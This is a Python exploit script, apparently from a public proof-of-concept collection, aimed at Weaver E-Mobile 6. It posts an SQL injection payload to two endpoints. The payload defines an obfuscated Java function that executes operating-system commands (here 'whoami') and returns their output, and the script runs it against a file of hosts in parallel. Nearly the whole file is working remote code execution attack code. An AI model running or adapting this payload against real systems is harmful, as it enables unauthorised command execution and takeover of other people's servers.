#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# icon_hash="1578525679"

import sys
import requests
import csv
import HackRequests
from concurrent.futures import ThreadPoolExecutor
raw='''------WebKitFormBoundaryTm8YXcJeyKDClbU7\r\nContent-Disposition: form-data; name="method"\r\n\r\ncreate\r\n------WebKitFormBoundaryTm8YXcJeyKDClbU7\r\nContent-Disposition: form-data; name="typeName"\r\n\r\n1';CREATE ALIAS if not exists MzSNqKsZTagmf AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass("com.caucho.server.dispatch.ServletInvocation").getMet','hod("getContextRequest").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField("_response");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod("getWriter");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter("\\\\A");writer.write(scan','ner.hasNext()?sca','nner.next():"");}');CALL MzSNqKsZTagmf(' whoami');--\r\n------WebKitFormBoundaryTm8YXcJeyKDClbU7--'''
raw1='''------WebKitFormBoundaryTm8YXcJeyKDClbU7\r\nContent-Disposition: form-data; name="method"\r\n\r\ngetupload\r\n------WebKitFormBoundaryTm8YXcJeyKDClbU7\r\nContent-Disposition: form-data; name="uploadID"\r\n\r\n1';CREATE ALIAS if not exists MzSNqKsZTagmf AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass("com.caucho.server.dispatch.ServletInvocation").getMet','hod("getContextRequest").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField("_response");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod("getWriter");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter("\\\\A");writer.write(scan','ner.hasNext()?sca','nner.next():"");}');CALL MzSNqKsZTagmf(' whoami');--\r\n------WebKitFormBoundaryTm8YXcJeyKDClbU7--'''
if len(sys.argv) != 2:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                   +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                           +')
    print(
        '+ EXP: python3 Weaver_E_Mobile_6_RCE_Exp.py url.txt                                                         +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    sys.exit()
    
def exp(host):
    proxysdata = {
'http': '127.0.0.1:8080'
}
    url = "http://" + host
    headers = {
        "Host": "%s" % host,
        'Accept-Encoding': '',
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
        "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundaryTm8YXcJeyKDClbU7"
    }
    vulurl1 = url + "/client.do"
    vulurl2 = url + "/messageType.do"
    try:
        r1 =requests.post(vulurl1, headers=headers,data=str(raw1),timeout=15)
        r2 =requests.post(vulurl2, headers=headers,data=str(raw),timeout=15)
        if  "authority" in r1.text or "authority" in r2.text:
            if  "system" in r1.text:
                print ("vulurl: "+vulurl1)
            else :
                print ("vulurl: "+vulurl2)
        else :
            return 0
            print (host+":false")
    except:
        print (host+"false")


if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(exp, row[0])
